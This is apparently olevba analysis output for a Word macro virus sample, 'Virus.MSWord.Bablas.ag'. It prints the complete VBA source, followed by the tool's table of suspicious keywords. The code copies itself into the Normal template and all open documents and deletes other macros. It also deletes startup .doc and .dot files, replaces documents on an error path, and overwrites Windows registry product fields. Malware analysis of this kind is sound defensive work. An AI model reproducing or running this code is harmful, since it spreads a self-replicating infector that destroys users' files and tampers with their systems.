olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.ag
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.ag - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aAntiVirus.bas 
in file: Virus.MSWord.Bablas.ag - OLE stream: 'Macros/VBA/aAntiVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'This macro is dedicated to every single hacker
'thank for all the education
'if this macro is beginning to annoying you contact me:
'jonthebest@yahoo.com,..@hotmail,..@geocities,..@hot### or call +62-251-245%0%
'Thank for spreading this macro.
Sub ToolsMacro()
    Application.StatusBar = "Don;t Worry aNtiVirus Macro is loaded"
End Sub
Sub ViewVbCode()
    ToolsMacro
End Sub
Sub FileTemplates()
    ToolsMacro
End Sub
Sub SikatDokumen()
  On Error GoTo Erro
  Application.StatusBar = "Checking Documents...."
  Dim DocOk As Boolean
  Dim Nama As String
  For Each aDoc In Documents
    DocOk = False
    For Each Obj In aDoc.VBProject.VBComponents
        If Obj.Name = "aAntiVirus" Then DocOk = True
        If Obj.Name <> "aAntiVirus" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=aDoc.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=aDoc.FullName, Name:="aAntiVirus", Object:=wdOrganizerObjectProjectItems
    End If
  Next aDoc
Erro:
 If Err.Number = "50289" Then
   Application.StatusBar = "Backing Up File...."
   Selection.WholeStory
   Selection.Copy
   Documents.Add
   Selection.Paste
   Nama = aDoc.FullName
   aDoc.Close
   Kill Nama
   Application.OrganizerCopy Source:=NormalTemplate.FullName, _
   Destination:=ActiveDocument.FullName, Name:="aAntiVirus", Object:=wdOrganizerObjectProjectItems
   ActiveDocument.SaveAs Nama
   Application.StatusBar = "For all do regret, i have to change document and restore as it was as possible, Dear Subscriber - Message from JonTheBest"
   Application.StatusBar = "Done!"
   Exit Sub
 End If
Application.StatusBar = "Done"
End Sub
Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "aAntiVirus" Then NorOk = True
        If Obj.Name <> "aAntiVirus" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="aAntiVirus", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
End Sub
Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    Application.StatusBar = "Ready to check Document"
    If Dialogs(80).Show <> 0 Then
      SikatDokumen
    End If
    WordBasic.DisableAutoMacros False
End Sub
Sub AutoOpen()
   On Error Resume Next
   If AddIns.Count >= 1 Then AddIns.Unload True
   Kill Options.DefaultFilePath(wdStartupPath) & "\*.dot"
   Kill Options.DefaultFilePath(wdStartupPath) & "\*.doc"
   SikatTemplate
   SikatDokumen
   On Error Resume Next
End Sub
Sub AutoClose()
    SikatDokumen
End Sub
Sub AutoExec()
On Error Resume Next
Dim chri
chri = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName")
If Not chri = "JonMMx 2000" Then
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "JonMMx 2000"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductID") = "10701-OEM-0010907-06212"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductKey") = "D4EST-R9OY9-6YOU9-R9V68-OM2P3"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "fUCK up Your Live"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "JonMMx 2000"
   Shell "Command.com /c scanreg.exe /backup", vbHide
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |scanreg.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

